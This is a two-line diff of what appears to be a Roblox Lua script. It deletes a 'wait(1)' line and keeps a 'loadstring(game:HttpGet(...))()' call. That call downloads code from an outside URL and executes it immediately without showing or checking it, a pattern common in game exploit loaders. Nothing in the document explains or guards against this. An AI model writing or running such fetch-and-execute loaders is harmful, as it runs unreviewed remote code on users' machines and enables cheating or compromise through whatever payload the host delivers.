@@ -1,2 +1,2 @@
-wait(1)
+
 loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/64dcb0b4acbb4e3b95297d0341ca2be8"))()
